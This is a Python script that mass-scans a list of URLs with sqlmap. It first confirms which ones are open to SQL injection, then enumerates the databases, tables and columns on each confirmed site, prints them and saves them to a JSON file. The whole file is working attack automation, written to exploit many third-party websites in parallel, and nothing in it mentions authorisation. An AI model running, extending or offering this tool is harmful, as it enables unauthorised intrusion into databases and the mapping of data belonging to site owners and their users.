import subprocess
import os
import time
import json
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing and file writing
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (used by the thread pool)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --batch to skip prompts and --smart for speed
    result = subprocess.run(["sqlmap", "-u", url, "--batch", "--smart", "--level=1"], capture_output=True, text=True)

    # Uses the lock to prevent overlapping output
    with print_lock:
        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls list safely
            verified_urls.append(url)
        else:
            # Outputs the url was a false positive
            print(f"[-] False Positive: {url}")

# Function to extract everything in one streamlined pass to prevent looping stalls
def extract_full_schema(url):
    # Stores the organized data
    schema_data = {}
    
    # List of system databases to ignore
    exclude_sys = "information_schema,mysql,performance_schema,sys,postgres"

    # Runs sqlmap to get ALL tables and columns at once, excluding system DBs
    # This is MUCH faster than looping through individual DBs and Tables manually
    result = subprocess.run(
        ["sqlmap", "-u", url, "--batch", "--threads=10", "--tables", "--columns", "--exclude-sysdbs"], 
        capture_output=True, 
        text=True,
        timeout=300 # 5-minute hard limit per target
    )

    current_db = None
    current_table = None

    # Parses the massive output block into our dictionary
    for line in result.stdout.splitlines():
        # Identifies the Database marker
        if "Database:" in line:
            current_db = line.split()[-1]
            schema_data[current_db] = {}
        
        # Identifies the Table marker in the grid output
        elif "Table:" in line:
            current_table = line.split()[-1]
            if current_db:
                schema_data[current_db][current_table] = []

        # Identifies column entries in the grid
        elif "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
            parts = [p.strip() for p in line.split("|") if p.strip()]
            if parts and current_db and current_table:
                # Adds the column name to the table list
                schema_data[current_db][current_table].append(parts[0])

    return schema_data

# Function to save findings to a JSON file safely
def save_to_json(url, data):
    filename = "./results.json"
    # Uses the lock to prevent simultaneous file access
    with print_lock:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                try:
                    all_results = json.load(f)
                except:
                    all_results = {}
        else:
            all_results = {}

        all_results[url] = data
        with open(filename, "w") as f:
            json.dump(all_results, f, indent=4)

# Function to process a single verified URL entirely
def process_target(url):
    # Uses the lock to announce the target
    with print_lock:
        print(f"\n[!] SCANNED TARGET: {url}")

    try:
        # Extracts full schema in one optimized command
        final_data = extract_full_schema(url)
        
        # Uses the lock to print to terminal and save JSON
        with print_lock:
            if not final_data:
                print(f"[-] No data extracted for {url} (Possible WAF or Timeout)")
                return

            # Loops through the extracted data to format terminal output
            for db, tables in final_data.items():
                print(f" |-- DB: {db}")
                for table, columns in tables.items():
                    print(f" |   |-- [T] {table}: {', '.join(columns)}")
            
            # Saves the data to the JSON file
            save_to_json(url, final_data)
            print(f"[✓] Data secured for: {url}\n")
            
    except subprocess.TimeoutExpired:
        with print_lock:
            print(f"[X] Timed out: {url} (Target taking too long)")

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    if os.path.isfile(results_path):
        print("[+] Importing data")
        raw_data = import_results_data(results_path)

        print("[+] Filtering data (Threaded)")
        verified_urls = []
        with ThreadPoolExecutor(max_workers=10) as filter_exec:
            for url in raw_data:
                filter_exec.submit(verify_single_url, url, verified_urls)

        # Reduced workers for the heavy scan to prevent CPU lockup
        print(f"[+] Processing {len(verified_urls)} confirmed targets...")
        with ThreadPoolExecutor(max_workers=3) as executor:
            for url in verified_urls:
                executor.submit(process_target, url)
    else:
        print("[!] Invalid file path")

    elapsed = time.perf_counter() - start_time
    print(f"\n[✓] Finished in {elapsed:.2f} seconds.")

if __name__ == "__main__":
    main()